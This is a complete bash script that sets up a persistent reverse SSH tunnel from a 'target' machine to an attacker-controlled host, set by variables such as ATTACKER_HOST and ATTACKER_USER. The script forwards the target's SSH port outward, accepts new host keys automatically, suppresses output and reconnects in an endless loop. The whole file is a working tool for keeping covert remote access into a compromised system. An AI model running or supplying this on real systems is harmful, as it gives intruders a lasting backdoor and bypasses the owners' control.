#!/usr/bin/env bash
#===============================================================================
# reverse-ssh.sh - Establish a reverse SSH tunnel for remote access
#===============================================================================
# This script creates an outbound SSH connection to a controlled server and
# sets up a reverse port forward. It supports both plain SSH and autossh.
#
# Usage:
#   ./reverse-ssh.sh [-c CONFIG] [-v] [-h]
#
# Options:
#   -c CONFIG   Path to configuration file (default: ./target.env)
#   -v          Enable verbose debug logging
#   -h          Show help
#
#===============================================================================

set -euo pipefail

# Script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Default configuration file
CONFIG_FILE="$SCRIPT_DIR/target.env"

# Default log file
LOG_FILE="/var/log/reverse-ssh.log"

# Log levels
LOG_LEVEL_DEBUG=0
LOG_LEVEL_INFO=1
LOG_LEVEL_WARN=2
LOG_LEVEL_ERROR=3
LOG_LEVEL=${LOG_LEVEL_INFO}

# Colors for console output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

#-------------------------------------------------------------------------------
# Logging functions
#-------------------------------------------------------------------------------
log() {
    local level="$1"; shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_line="[$timestamp] [$level] $msg"

    # Write to log file if writable
    if [[ -n "$LOG_FILE" ]] && { [[ -w "$LOG_FILE" ]] || touch "$LOG_FILE" 2>/dev/null; }; then
        echo "$log_line" >> "$LOG_FILE"
    fi

    # Output to console based on log level
    case "$level" in
        DEBUG)   [[ $LOG_LEVEL -le $LOG_LEVEL_DEBUG ]] && echo -e "${BLUE}$log_line${NC}" ;;
        INFO)    [[ $LOG_LEVEL -le $LOG_LEVEL_INFO ]]  && echo -e "${GREEN}$log_line${NC}" ;;
        WARN)    [[ $LOG_LEVEL -le $LOG_LEVEL_WARN ]]  && echo -e "${YELLOW}$log_line${NC}" ;;
        ERROR)   [[ $LOG_LEVEL -le $LOG_LEVEL_ERROR ]] && echo -e "${RED}$log_line${NC}" ;;
    esac
}

log_debug() { log "DEBUG" "$@"; }
log_info()  { log "INFO"  "$@"; }
log_warn()  { log "WARN"  "$@"; }
log_error() { log "ERROR" "$@"; exit 1; }

#-------------------------------------------------------------------------------
# Usage
#-------------------------------------------------------------------------------
usage() {
    cat <<EOF
Usage: $0 [options]

Options:
  -c CONFIG   Path to configuration file (default: ./target.env)
  -v          Enable verbose debug logging
  -h          Show this help
EOF
    exit 0
}

#-------------------------------------------------------------------------------
# Parse command line arguments
#-------------------------------------------------------------------------------
while getopts "c:vh" opt; do
    case "$opt" in
        c) CONFIG_FILE="$OPTARG" ;;
        v) LOG_LEVEL=$LOG_LEVEL_DEBUG ;;
        h) usage ;;
        *) usage ;;
    esac
done

#-------------------------------------------------------------------------------
# Load configuration file
#-------------------------------------------------------------------------------
if [[ -f "$CONFIG_FILE" ]]; then
    log_debug "Loading configuration from $CONFIG_FILE"
    # shellcheck disable=SC1090
    source "$CONFIG_FILE"
else
    log_warn "Configuration file $CONFIG_FILE not found. Using environment variables or defaults."
fi

#-------------------------------------------------------------------------------
# Validate required variables
#-------------------------------------------------------------------------------
validate_config() {
    local missing=0
    for var in ATTACKER_USER ATTACKER_HOST ATTACKER_PORT SSH_KEY REMOTE_FORWARD_PORT TARGET_SSH_HOST TARGET_SSH_PORT; do
        if [[ -z "${!var:-}" ]]; then
            log_error "Required variable '$var' is not set."
            missing=1
        fi
    done
    if [[ $missing -ne 0 ]]; then
        exit 1
    fi

    # Ensure SSH key exists and has correct permissions
    if [[ ! -f "$SSH_KEY" ]]; then
        log_error "SSH key file $SSH_KEY not found."
    fi
    if [[ $(stat -c %a "$SSH_KEY") != "600" ]]; then
        log_warn "SSH key permissions are not 600. Attempting to fix..."
        chmod 600 "$SSH_KEY" || log_error "Failed to set permissions on $SSH_KEY."
    fi
}

#-------------------------------------------------------------------------------
# Build SSH command
#-------------------------------------------------------------------------------
build_ssh_command() {
    local cmd=()
    local ssh_bin="ssh"

    # Use autossh if requested and available
    if [[ "${USE_AUTOSSH:-false}" == "true" ]] && command -v autossh >/dev/null 2>&1; then
        log_info "Using autossh for automatic reconnection."
        ssh_bin="autossh"
        cmd+=("-M" "0") # Disable monitoring port, use ServerAlive instead
    else
        log_info "Using plain SSH."
    fi

    cmd+=(
        "-i" "$SSH_KEY"
        "-N"                       # Do not execute remote command
        "-R" "${REMOTE_FORWARD_PORT}:${TARGET_SSH_HOST}:${TARGET_SSH_PORT}"
        "-o" "ServerAliveInterval=${SERVER_ALIVE_INTERVAL:-60}"
        "-o" "ServerAliveCountMax=${SERVER_ALIVE_COUNT_MAX:-3}"
        "-o" "ExitOnForwardFailure=yes"
        "-o" "StrictHostKeyChecking=accept-new"
        "-o" "UserKnownHostsFile=${SCRIPT_DIR}/known_hosts"
        "-o" "LogLevel=ERROR"
        "-q"
        "-p" "${ATTACKER_PORT}"
    )

    # Append optional extra SSH options
    if [[ -n "${SSH_OPTIONS:-}" ]]; then
        # Word splitting intended for multiple options
        # shellcheck disable=SC2206
        cmd+=($SSH_OPTIONS)
    fi

    cmd+=("${ATTACKER_USER}@${ATTACKER_HOST}")

    echo "${cmd[@]}"
}

#-------------------------------------------------------------------------------
# Main function
#-------------------------------------------------------------------------------
main() {
    log_info "Starting reverse SSH tunnel..."
    log_debug "Config file: $CONFIG_FILE"
    log_debug "Attacker: ${ATTACKER_USER}@${ATTACKER_HOST}:${ATTACKER_PORT}"
    log_debug "Remote forward: ${REMOTE_FORWARD_PORT} -> ${TARGET_SSH_HOST}:${TARGET_SSH_PORT}"

    validate_config

    local ssh_cmd
    ssh_cmd=$(build_ssh_command)

    # Trap signals to log exit
    trap 'log_info "Reverse SSH tunnel stopped."; exit 0' INT TERM

    # Retry loop for plain SSH (autossh handles its own reconnection)
    while true; do
        log_info "Attempting to establish tunnel..."
        # shellcheck disable=SC2086
        $ssh_cmd

        if [[ "${USE_AUTOSSH:-false}" != "true" ]]; then
            log_warn "SSH connection lost. Retrying in 10 seconds..."
            sleep 10
        else
            log_warn "autossh exited. Retrying in 10 seconds..."
            sleep 10
        fi
    done
}

#-------------------------------------------------------------------------------
# Run main
#-------------------------------------------------------------------------------
main "$@"